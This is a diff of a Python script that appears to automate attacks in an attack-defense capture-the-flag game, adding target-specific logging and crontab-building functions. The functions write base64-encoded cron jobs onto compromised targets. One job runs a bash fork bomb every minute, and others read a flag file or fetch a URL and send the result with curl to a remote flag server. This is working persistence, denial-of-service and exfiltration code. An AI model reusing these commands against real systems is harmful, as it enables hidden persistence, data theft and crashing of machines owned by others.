@@ -23,6 +23,10 @@ def write_sys_log(msg):
     sys_time = time.strftime('%Y-%m-%d %H:%M:%S',(time.localtime(time.time())))
     open(sys_log,'a').write(sys_time + "  " + msg+'\n')
 
+def write_specific_log(target,target_port,msg):
+    sys_time = time.strftime('%Y-%m-%d %H:%M:%S',(time.localtime(time.time())))
+    open(specific_status_log + target + ":" + target_port,'a').write(sys_time + "  " + msg + '\n')
+
 def dump_error(e,target="",load_script=""):
     if not target and not load_script:
         return Log.error(str(e))
@@ -30,7 +34,6 @@ def dump_error(e,target="",load_script=""):
     + " with the script: " + load_script
     Log.error(msg)
     write_sys_log(msg)
-    
 
 def dump_warning(e,target="",load_script=""):
     if not target and not load_script:
@@ -200,7 +203,6 @@ def crontab_rm(target,target_port,cmd):
     debug_print(cmd)
     return cmd
 
-
 def crontab_shellbomb(target,target_port,cmd):
     cmd = "/bin/echo '.() { .|.& } && .' > /tmp/aaa;/bin/bash /tmp/aaa;"
     crontab_cmd = "* * * * * %s\n"%cmd
@@ -219,6 +221,14 @@ def crontab_flag_ip(target,target_port,cmd):
 
 def crontab_flag_submit(target,target_port,cmd):
     cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s&flag=$(/bin/cat %s)"' %(flag_server,flag_port,flag_url,flag_token,flag_path)
+    crontab_cmd = "* * * * * %s\n"%cmd
+    encode_crontab_cmd = base64.b64encode(crontab_cmd)
+    cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
+    debug_print(cmd)
+    return cmd
+
+def crontab_flag_remote(target,target_port,cmd):
+    cmd = '/usr/bin/curl "http://%s:%s/%s" -d "token=%s&flag=$(/usr/bin/curl %s)"' %(flag_server,flag_port,flag_url,flag_token,get_flag_url)
     crontab_cmd = "* * * * * %s\n"%cmd
     encode_crontab_cmd = base64.b64encode(crontab_cmd)
     cmd = "/bin/echo " + encode_crontab_cmd + " | /usr/bin/base64 -d | /bin/cat >> " + crontab_path + "/tmp.conf" + " ; " + "/usr/bin/crontab " + crontab_path + "/tmp.conf"
